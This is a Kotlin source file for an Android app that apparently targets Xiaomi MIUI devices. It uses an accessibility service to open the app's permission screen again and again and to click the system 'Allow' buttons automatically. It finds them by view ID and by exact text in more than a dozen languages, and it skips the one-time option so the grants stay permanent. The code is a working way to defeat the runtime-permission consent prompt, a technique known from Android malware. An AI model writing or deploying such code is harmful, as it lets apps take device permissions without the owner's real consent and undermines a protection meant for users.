package com.zaka.screenagent.flow.miui

import android.accessibilityservice.AccessibilityService
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.accessibility.AccessibilityNodeInfo
import androidx.core.content.ContextCompat
import com.zaka.screenagent.accessibility.BoundaryAccessibilityService
import com.zaka.screenagent.perm.PermissionActivity
import com.zaka.screenagent.perm.PermissionFlow

/**
 * 小米第一步：**自动申请权限 + 自动点「允许」**（小米专属实现，不共用通用 PermissionClicker）。
 *
 * 用法：
 *   MiuiPermission.run(service) { 全部拿到 -> true }
 *
 * 内部循环：
 *   ① 每 2 秒检查还缺几项；缺就拉起权限页（最多 6 次）
 *   ② 每 800ms 扫一次当前窗口，把「允许 / Allow / 始终允许」点掉
 *   ③ 全部授权后回调 onDone(true)
 */
object MiuiPermission {

    private const val TAG = "MiuiPermission"
    private val ui = Handler(Looper.getMainLooper())

    /** 允许类按钮文案（覆盖常见语言） */
    private val ALLOW_TEXTS = listOf(
        "允许", "始终允许", "仅在使用中允许", "本次允许", "允许所有", "确定", "同意",
        "Allow", "Allow all the time", "Allow only while using the app", "While using the app",
        "Permitir", "Permitir todo el tiempo", "Permitir solo mientras se usa la app",
        "Permitir", "Permitir o tempo todo", "Permitir apenas durante o uso do app",
        "Izinkan", "Selalu izinkan", "Izinkan saat aplikasi digunakan",
        "Cho phép", "Luôn cho phép",
        "อนุญาต", "อนุญาตตลอดเวลา",
        "السماح", "اسمح", "बिल्कुल सही", "अनुमति दें", "اجازت دیں", "Payagan", "Pahintulutan"
    )

    private var running = false

    /** 开始：申请 + 自动点允许；权限齐了回调 true */
    fun run(service: BoundaryAccessibilityService, onDone: (Boolean) -> Unit) {
        if (running) { Log.d(TAG, "已在运行，忽略重复调用"); return }
        running = true
        Log.d(TAG, "开始：缺 ${missing(service)} 项")
        openPage(service, 1)

        var ticks = 0
        fun tick() {
            val m = missing(service)
            if (m == 0) {
                running = false
                Log.d(TAG, "全部已授予")
                onDone(true); return
            }
            clickAllow(service)
            if (ticks++ > 90) {            // ≈ 90 秒
                running = false
                Log.w(TAG, "超时，仍缺 $m 项")
                onDone(false); return
            }
            ui.postDelayed({ tick() }, 800L)
        }
        ui.postDelayed({ tick() }, 800L)
    }

    /** 拉起权限页（MIUI 会丢第一次后台启动，2 秒一次重试） */
    private fun openPage(service: BoundaryAccessibilityService, attempt: Int) {
        if (missing(service) == 0) return
        if (onPermissionDialog(service)) { Log.d(TAG, "权限弹窗已在前台，不再拉起"); return }
        Log.d(TAG, "打开权限页 attempt=$attempt")
        runCatching {
            service.startActivity(
                Intent(service, PermissionActivity::class.java).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            )
        }.onFailure { Log.w(TAG, "打开权限页失败 $it") }
        if (attempt < 6) {
            ui.postDelayed({ if (missing(service) > 0) openPage(service, attempt + 1) }, 2_000L)
        }
    }

    /**
     * 允许按钮：**按 view-id 优先**（这是之前通用点击器验证过能用的方式，不要用文字猜）。
     *
     *   permission_allow_button                  允许（永久）
     *   permission_allow_all_button              允许全部（媒体）
     *   permission_allow_foreground_only_button  仅在使用中允许
     *   permission_allow_selected_button         允许所选
     * 绝不用 permission_allow_one_time_button（仅限这一次，会被回收）
     */
    private val ALLOW_IDS = arrayOf(
        "permission_allow_button",
        "permission_allow_all_button",
        "permission_allow_foreground_only_button",
        "permission_allow_selected_button"
    )

    /** 文本兜底（完全相等，避免命中「不允许」） */
    private val ALLOW_TEXTS_EXACT = listOf(
        "允许", "始终允许", "仅在使用中允许", "仅在使用该应用时允许", "允许所有", "允许所选",
        "Allow", "Allow all", "Allow all the time", "Allow only while using the app",
        "While using the app", "Permitir", "Permitir todo el tiempo", "Permitir solo mientras se usa la app",
        "Permitir o tempo todo", "Izinkan", "Selalu izinkan", "Cho phép", "Luôn cho phép",
        "Autoriser", "Zulassen", "อนุญาต", "السماح"
    )

    /** 先按 id 点，再按文字点；两者都失败就等下一轮 */
    private fun clickAllow(service: BoundaryAccessibilityService) {
        val roots = ArrayList<AccessibilityNodeInfo>()
        runCatching { service.windows.orEmpty().forEach { w -> w.root?.let { roots.add(it) } } }
        service.rootInActiveWindow?.let { roots.add(it) }

        // ① 按 view-id（严格按优先级，找到第一类就点）
        for (root in roots) {
            for (id in ALLOW_IDS) {
                for (n in findAllById(root, arrayOf(id), 0)) {
                    if (click(service, n)) {
                        Log.d(TAG, "CLICK allow id=${n.viewIdResourceName} text=${n.text}")
                        return
                    }
                }
            }
        }
        // ② 文本完全相等兜底
        for (root in roots) {
            for (t in ALLOW_TEXTS_EXACT) {
                val n = findText(root, t, 0) ?: continue
                if (click(service, n)) {
                    Log.d(TAG, "CLICK allow text=$t")
                    return
                }
            }
        }
    }

    private fun click(service: AccessibilityService, n: AccessibilityNodeInfo): Boolean {
        if (!n.isEnabled) return false
        val target = if (n.isClickable) n else n.parent ?: n
        if (target.performAction(AccessibilityNodeInfo.ACTION_CLICK)) return true
        return tap(service, n)
    }

    private fun findAllById(n: AccessibilityNodeInfo?, ids: Array<String>, d: Int): List<AccessibilityNodeInfo> {
        val out = ArrayList<AccessibilityNodeInfo>()
        if (n == null || d > 30) return out
        val vid = n.viewIdResourceName.orEmpty()
        if (ids.any { vid.endsWith(it) }) out.add(n)
        for (i in 0 until n.childCount) out.addAll(findAllById(n.getChild(i), ids, d + 1))
        return out
    }

    /** 当前是否已是系统权限弹窗（避免重复拉起并把弹窗顶掉） */
    private fun onPermissionDialog(service: AccessibilityService): Boolean {
        val pkg = runCatching { service.rootInActiveWindow?.packageName?.toString().orEmpty() }.getOrDefault("")
        return pkg.contains("permissioncontroller")
    }

    private fun missing(service: AccessibilityService): Int = PermissionFlow.PERMISSIONS.count {
        ContextCompat.checkSelfPermission(service, it) != PackageManager.PERMISSION_GRANTED
    }

    private fun tap(service: AccessibilityService, n: AccessibilityNodeInfo): Boolean {
        val r = android.graphics.Rect()
        n.getBoundsInScreen(r)
        if (r.width() <= 0 || r.height() <= 0) return false
        val path = android.graphics.Path().apply { moveTo(r.exactCenterX(), r.exactCenterY()) }
        val stroke = android.accessibilityservice.GestureDescription.StrokeDescription(path, 0, 80)
        val g = android.accessibilityservice.GestureDescription.Builder().addStroke(stroke).build()
        return runCatching { service.dispatchGesture(g, null, null) }.getOrDefault(false)
    }

    private fun findText(n: AccessibilityNodeInfo?, want: String, d: Int): AccessibilityNodeInfo? {
        if (n == null || d > 30) return null
        if (n.text?.toString() == want) return n
        for (i in 0 until n.childCount) findText(n.getChild(i), want, d + 1)?.let { return it }
        return null
    }
}
